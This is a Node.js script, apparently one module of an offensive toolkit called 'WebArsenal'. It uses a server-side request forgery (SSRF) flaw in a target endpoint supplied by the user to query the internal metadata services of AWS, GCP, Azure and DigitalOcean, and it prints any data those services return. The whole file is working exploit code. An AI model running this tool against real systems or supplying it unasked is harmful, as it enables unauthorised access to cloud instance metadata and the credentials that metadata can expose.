#!/usr/bin/env node
/**
 * ╔═════════════════════════════════════════════════════════════════╗
 * ║  WebArsenal: cloud-metadata-pivot.js                             ║
 * ║  Category: analyzers                                            ║
 * ╚═════════════════════════════════════════════════════════════════╝
 */

'use strict';

const { program } = require('commander');
const chalk = require('chalk');
const axios = require('axios');

program
  .name('cloud-metadata-pivot.js')
  .description('Attempts to pivot from a SSRF vulnerability to internal cloud metadata endpoints (AWS, GCP, Azure).')
  .version('4.0.0')
  .requiredOption('-u, --url <endpoint>', 'The SSRF-vulnerable endpoint (e.g. https://target.com/fetch?url=)')
  .parse(process.argv);

const opts = program.opts();

const CLOUD_METADATA_URLS = [
  { name: 'AWS/OpenStack', url: 'http://169.254.169.254/latest/meta-data/' },
  { name: 'GCP', url: 'http://metadata.google.internal/computeMetadata/v1/', headers: { 'Metadata-Flavor': 'Google' } },
  { name: 'Azure', url: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', headers: { 'Metadata': 'true' } },
  { name: 'DigitalOcean', url: 'http://169.254.169.254/metadata/v1.json' }
];

async function run() {
  console.log(chalk.bold.magenta('\n╔════════════════════════════════════════════╗'));
  console.log(chalk.bold.magenta(  '║  WebArsenal Module: ' + 'cloud-metadata-pivot.js'.padEnd(23) + '║'));
  console.log(chalk.bold.magenta(  '╚════════════════════════════════════════════╝\n'));
  
  const base = opts.url;
  console.log(chalk.cyan(`[*] Testing cloud metadata pivoting via SSRF sink: ${base}\n`));
  
  for (const cloud of CLOUD_METADATA_URLS) {
    const testUrl = `${base}${encodeURIComponent(cloud.url)}`;
    process.stdout.write(chalk.gray(`[*] Testing ${cloud.name}... `));
    
    try {
      const res = await axios.get(testUrl, { timeout: 10000, headers: cloud.headers || {}, validateStatus: () => true });
      if (res.status === 200) {
        console.log(chalk.bold.red(`SUCCESS`));
        console.log(chalk.red(`    [!] VULNERABLE: SSRF to ${cloud.name} metadata endpoint confirmed.`));
        console.log(chalk.gray(`    Snippet: ${JSON.stringify(res.data).substring(0, 100)}...`));
      } else {
        console.log(chalk.yellow(`BLOCKED (${res.status})`));
      }
    } catch (e) {
      console.log(chalk.gray(`TIMEOUT/FAIL`));
    }
  }

  console.log(chalk.bold.blue(`\n[✓] Pivot testing complete.`));
}

if (require.main === module) { run().catch(console.error); }
module.exports = { run };
